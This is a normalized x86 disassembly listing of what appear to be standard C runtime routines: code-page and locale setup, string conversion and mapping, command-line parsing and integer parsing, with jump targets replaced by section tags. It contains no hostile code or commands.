lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_10006194
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_10041dbf
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_10041dbf
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_10079a10
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_1007abf7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1007ac73
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_1003b313
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_1004ac7a
pop ecx
cmp eax ebx
je r-xdata
call sub_1007d0c0
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_1003b313
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_1004ac7a
pop ecx
cmp eax ebx
je r-xdata
call sub_1007d0c0
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_1007ae5a
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_1005ec92
pop ecx
pop edi
sub_1007ae80
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0xc ] ebx
call sub_10008102
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
push [ esi + 0x58 ]
mov ebx 0x351
push r--data
push [ r--data ]
push 0x3
push ebx
push edi
call sub_100039c3
lea eax [ esi + 0x58 ]
add esp 0x18
mov [ ebp - 0x4 ] r--data
mov [ ebp - 0x8 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100492ed
mov eax [ ebp - 0x8 ]
lea ecx [ eax + 0x10 ]
push [ ecx ]
mov [ ebp - 0x8 ] ecx
push [ eax ]
call sub_10079ce0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push [ eax ]
add [ ebp - 0x4 ] 0xc
push r--data
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push [ eax ]
push 0x3
push ebx
push edi
call sub_100039c3
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_10022b5a
pop ecx
push r--data
push ebx
push edi
call sub_10006102
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push [ esi + 0x54 ]
call sub_10022b5a
pop ecx
push [ ebp - 0x10 ]
call sub_10022b5a
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_10022b5a
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_10022b5a
pop ecx
sub_1007afe5
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x198 ] eax
call sub_10039c8c
mov edi eax
push ebx
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push [ ebp - 0x198 ]
call sub_1005a883
add esp 0x18
test eax eax
jne r-xdata
shl ebx 0x4
add ebx esi
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10079ce0
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x88 ]
push eax
call sub_10079b60
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_10008102
pop ecx
pop ecx
mov [ ebp - 0x194 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x48 ]
mov ecx [ ebp - 0x190 ]
mov [ ebp - 0x198 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
mov [ ebp - 0x1a8 ] eax
mov eax [ eax ]
mov [ ebp - 0x1b8 ] eax
lea eax [ ecx + 0x6 ]
imul eax eax 0x6
add eax esi
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c8 ]
push eax
call sub_100796a0
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x194 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_1006605f
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100492ed
int3
mov eax [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_100796a0
add esp 0xc
cmp [ ebp - 0x190 ] 0x2
jne r-xdata
cmp [ ebp - 0x190 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1a4 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x1f4 ]
mov ecx [ edi + 0x1f0 ]
mov [ ebp - 0x19c ] eax
lea eax [ edi + 0x1d0 ]
mov eax [ ebp - 0x190 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1a4 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c0 ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x198 ] rw-data
je r-xdata
mov eax [ ebp - 0x198 ]
push [ ebp - 0x194 ]
mov [ ebx + 0x48 ] eax
call sub_10022b5a
mov eax [ ebp - 0x1b8 ]
pop ecx
mov ecx [ ebp - 0x1a8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 + 0x1d0 ]
mov edx [ eax ]
mov [ edi + 0x1d0 ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x1d4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x190 ]
mov eax [ ebp - 0x194 ]
add ecx 0x5
add ecx ecx
mov [ eax ] 0x1
mov [ esi + ecx * 8 ] eax
jmp r-xdata
mov edi [ ebp - 0x190 ]
add edi 0x5
add edi edi
push [ esi + edi * 8 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x1d4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_10006194
add esp 0x20
test eax eax
je r-xdata
push [ esi + edi * 8 ]
call sub_10022b5a
push [ ebx + 0x54 ]
call sub_10022b5a
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x1d4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_10055c4b
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x1d4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x1d0 ] eax
sub_1007b31f
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_1007ae80
cmp [ eax ] 0x4c
jne r-xdata
add ecx ecx
mov eax [ esi + ecx * 8 + 0x48 ]
jmp r-xdata
push eax
call sub_1007afe5
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea ecx [ ebp - 0x88 ]
push ecx
push eax
call sub_1005a883
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ eax + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn
lea edi [ esi + 0x48 ]
cmp [ eax + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10079ce0
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi eax
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
mov ecx ebx
call sub_1007afe5
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_10062175
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_10079b60
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_1007d0f0
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_100317fa
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100492ed
mov ecx [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
mov [ ebp + edi - 0x88 ] al
lea eax [ ebp - 0x88 ]
push eax
call sub_1007afe5
pop ecx
test eax eax
je r-xdata
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_1007d6d0
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_1007b53b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_1007b572
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_100273a7
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_100273a7
pop ecx
test eax eax
je r-xdata
call sub_100273a7
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_1007b70c
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x2
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_1005ec40
add esp 0xc
test eax eax
je r-xdata
call sub_1000977c
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
push [ esi ]
push [ ebp + 0xc ]
push [ edi ]
call sub_100796a0
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_1007b763
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_100318af
test eax eax
movsx eax [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop ebp
retn
and eax 0xffffffdf
sub eax 0x7
sub_1007b799
mov edi edi
push ebp
mov ebp esp
push ebx
mov eax ebx
pop ebx
pop ebp
retn
movzx eax bl
push eax
call sub_100213ec
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
inc [ esi ]
call sub_1007b783
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_1007b7c3
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_1006a508
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_1001116c
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_1004fd6f
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
pop edi
pop ebx
sub_1007b9ee
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_10039c8c
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_1007ba33
mov edi edi
push ebp
mov ebp esp
xor eax eax
sub esp 0xc
cmp edi eax
jne r-xdata
mov [ ebp - 0x1 ] al
mov [ ebp - 0xc ] eax
cmp [ edi ] eax
jle r-xdata
call sub_100680f5
mov al [ ebp - 0x1 ]
leave
retn
push ebx
mov [ ebp - 0x8 ] eax
push esi
test ebx ebx
jg r-xdata
mov ecx [ ebp + 0x8 ]
push [ ecx + 0x1c ]
mov eax [ esi ]
push eax
mov eax [ edi + 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call sub_1002a922
add esp 0xc
test eax eax
jne r-xdata
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
dec ebx
add esi 0x4
inc [ ebp - 0xc ]
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] 0x10
cmp eax [ edi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
